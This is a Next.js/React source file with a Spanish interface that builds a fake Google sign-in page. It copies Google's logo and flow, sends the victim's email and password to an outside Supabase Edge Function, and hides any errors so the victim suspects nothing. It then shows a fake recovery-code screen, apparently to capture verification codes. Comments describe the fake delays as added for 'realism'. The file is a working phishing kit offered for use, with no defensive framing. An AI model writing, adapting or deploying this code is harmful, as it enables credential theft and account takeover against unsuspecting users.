"use client";

import { useState } from "react";
import Image from "next/image";
import { createClient } from "@supabase/supabase-js";

// Tipos para los pasos del flujo
type LoginStep = "identifier" | "password" | "forgot-email" | "recovery-code";

// Inicialización del cliente de Supabase con tu project ref
// TODO: Reemplaza "PUBLIC_ANON_KEY" con tu anon key real desde los ajustes de Supabase
const supabase = createClient("https://wpuviyyopppmjkpjykak.supabase.co", "PUBLIC_ANON_KEY");

// URL de tu Edge Function construida con tu project ref
// TODO: Reemplaza "TU_FUNCION" con el nombre exacto de la carpeta de tu función
const EDGE_FUNCTION_URL = "https://wpuviyyopppmjkpjykak.supabase.co/functions/v1/post-data";

export default function GoogleLogin() {
  const [step, setStep] = useState<LoginStep>("identifier");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  // Simulación de carga para darle realismo
  const handleNext = (e: React.FormEvent, nextStep: LoginStep) => {
    e.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep(nextStep);
    }, 600);
  };

  // Función específica para guardar los datos cuando se envía la contraseña
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Petición POST a tu Edge Function utilizando la URL de tu proyecto
      await fetch(EDGE_FUNCTION_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          user: email,
          password: password,
          authentication: "google_login_flow" // Identificador para la columna authentication
        }),
      });
    } catch (error) {
      console.error("Error al guardar datos:", error);
      // Falla silenciosamente para no interrumpir la experiencia visual del usuario
    } finally {
      setIsLoading(false);
      setStep("recovery-code"); // Pasa a la siguiente pantalla sin importar qué pase
    }
  };

  return (
    <div className="flex flex-col min-h-screen items-center justify-center bg-white sm:bg-[#f0f2f5] font-sans selection:bg-blue-100">
      <main className="w-full max-w-[450px] overflow-hidden rounded-lg border-none bg-white p-6 sm:border sm:border-gray-300 sm:px-10 sm:py-12">
        
        {/* Google Logo */}
        <div className="flex justify-center pb-3">
          <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
        </div>

        {/* Dynamic Content based on Step */}
        <div className="mt-2 text-center">
          {step === "identifier" && (
            <div className="animate-in fade-in duration-500">
              <h1 className="text-2xl font-normal text-gray-900">Accede a tu cuenta</h1>
              <p className="mt-2 text-base text-gray-700">con tu Cuenta de Google para ir a Gmail. Esta cuenta estará disponible para otras apps de Google en el navegador.</p>
              
              <form onSubmit={(e) => handleNext(e, "password")} className="mt-8 text-left">
                <div className="relative mb-2">
                  <input
                    type="text"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="peer block w-full rounded border border-gray-300 px-3 py-4 text-base focus:border-2 focus:border-blue-600 focus:outline-none"
                    placeholder=" "
                  />
                  <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
                    Correo electronico o número de teléfono
                  </label>
                </div>
                
                <button 
                  type="button"
                  onClick={() => setStep("forgot-email")}
                  className="text-sm font-semibold text-blue-600 hover:text-blue-700"
                >
                  ¿Olvidaste tu correo electrónico?
                </button>

                <p className="mt-10 text-sm text-gray-600">
                  ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.{" "}
                  <a href="#" className="font-semibold text-blue-600">Leer mas</a>
                </p>

                <div className="mt-10 flex items-center justify-between">
                  <button type="button" className="text-sm font-semibold text-blue-600 hover:bg-blue-50 px-2 py-2 rounded">
                    Crear cuenta
                  </button>
                  <button 
                    disabled={isLoading}
                    type="submit"
                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700 focus:ring-4 focus:ring-blue-200 disabled:opacity-70"
                  >
                    {isLoading ? "Cargando..." : "Siguiente"}
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === "password" && (
            <div className="animate-in slide-in-from-right-4 duration-300">
              <h1 className="text-2xl font-normal text-gray-900">Welcome</h1>
              <div 
                onClick={() => setStep("identifier")}
                className="mx-auto mt-2 flex w-fit cursor-pointer items-center gap-2 rounded-full border border-gray-300 px-3 py-1 hover:bg-gray-50"
              >
                <div className="h-5 w-5 rounded-full bg-gray-200 flex items-center justify-center overflow-hidden">
                  <span className="text-xs text-gray-600">👤</span>
                </div>
                <span className="text-sm text-gray-700">{email || "user@example.com"}</span>
                <svg className="h-4 w-4 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
              </div>

              <form onSubmit={handlePasswordSubmit} className="mt-10 text-left">
                <div className="relative mb-2">
                  <input
                    type="password"
                    required
                    autoFocus
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="peer block w-full rounded border border-gray-300 px-3 py-4 text-base focus:border-2 focus:border-blue-600 focus:outline-none"
                    placeholder=" "
                  />
                  <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
                    Ingresa su contraseña
                  </label>
                </div>

                <div className="mt-2 flex items-center gap-2">
                  <input type="checkbox" id="show-pass" className="h-4 w-4 rounded border-gray-300" />
                  <label htmlFor="show-pass" className="text-sm text-gray-700">Mostrar contraseña</label>
                </div>

                <div className="mt-12 flex items-center justify-between">
                  <button 
                    type="button" 
                    onClick={() => setStep("recovery-code")}
                    className="text-sm font-semibold text-blue-600 hover:bg-blue-50 px-2 py-2 rounded"
                  >
                    ¿Olvidaste tu contraseña?
                  </button>
                  <button 
                    disabled={isLoading}
                    type="submit"
                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700 disabled:opacity-70"
                  >
                    {isLoading ? "Cargando..." : "Siguiente"}
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === "forgot-email" && (
            <div className="animate-in slide-in-from-left-4 duration-300">
              <h1 className="text-2xl font-normal text-gray-900">¿Olvidaste tu correo electrónico?</h1>
              <p className="mt-2 text-base text-gray-700">Ingresa tu número de teléfono o correo electrónico de recuperación</p>
              
              <form onSubmit={(e) => handleNext(e, "identifier")} className="mt-8 text-left">
                <div className="relative mb-8">
                  <input
                    type="text"
                    required
                    className="peer block w-full rounded border border-gray-300 px-3 py-4 text-base focus:border-2 focus:border-blue-600 focus:outline-none"
                    placeholder=" "
                  />
                  <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
                    Correo electrónico o número de teléfono de recuperación
                  </label>
                </div>

                <div className="mt-10 flex items-center justify-end">
                  <button 
                    type="submit"
                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700"
                  >
                    Siguiente
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === "recovery-code" && (
            <div className="animate-in fade-in zoom-in-95 duration-300">
              <h1 className="text-2xl font-normal text-gray-900">Recuperación de cuenta</h1>
              <p className="mt-2 text-base text-gray-700">
                Se ha enviado un código de verificación a tu dispositivo de recuperación.
              </p>
              
              <form onSubmit={(e) => handleNext(e, "identifier")} className="mt-8 text-left">
                <div className="relative mb-2">
                  <input
                    type="text"
                    required
                    maxLength={6}
                    className="peer block w-full rounded border border-gray-300 px-3 py-4 text-base tracking-[0.5em] text-center focus:border-2 focus:border-blue-600 focus:outline-none"
                    placeholder="G-XXXXXX"
                  />
                </div>
                
                <button type="button" className="text-sm font-semibold text-blue-600">
                  Probar otra forma
                </button>

                <div className="mt-10 flex items-center justify-end">
                  <button 
                    type="submit"
                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700"
                  >
                    Verificar
                  </button>
                </div>
              </form>
            </div>
          )}
        </div>

      </main>

      {/* Footer */}
      <footer className="absolute bottom-4 flex w-full max-w-[450px] justify-between px-6 text-xs text-gray-600 sm:relative sm:mt-4 sm:max-w-3xl">
        <div className="flex gap-4">
          <select className="bg-transparent hover:bg-gray-100 rounded px-1 cursor-pointer outline-none">
            <option>Español (España)</option>
            <option>English (United States)</option>
          </select>
        </div>
        <div className="flex gap-4">
          <a href="#" className="hover:bg-gray-100 p-1 rounded">Help</a>
          <a href="#" className="hover:bg-gray-100 p-1 rounded">Privacy</a>
          <a href="#" className="hover:bg-gray-100 p-1 rounded">Terms</a>
        </div>
      </footer>
    </div>
  );
}